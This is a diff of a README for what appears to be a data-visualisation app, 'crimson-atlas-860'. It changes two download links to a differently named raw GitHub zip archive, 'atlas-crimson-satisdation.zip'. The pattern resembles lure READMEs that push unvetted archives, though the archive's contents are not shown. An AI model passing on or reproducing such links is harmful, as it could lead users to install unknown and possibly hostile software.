@@ -1,6 +1,6 @@
 # 🌟 crimson-atlas-860 - Explore Your Data Effortlessly
 
-![Download](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/crimson-atlas-860.zip)
+![Download](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/atlas-crimson-satisdation.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to crimson-atlas-860! This application helps you visualize and explore y
 
 To download crimson-atlas-860, visit the following link:
 
-[Download crimson-atlas-860](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/crimson-atlas-860.zip)
+[Download crimson-atlas-860](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/atlas-crimson-satisdation.zip)
 
 ### Steps to Download:
 
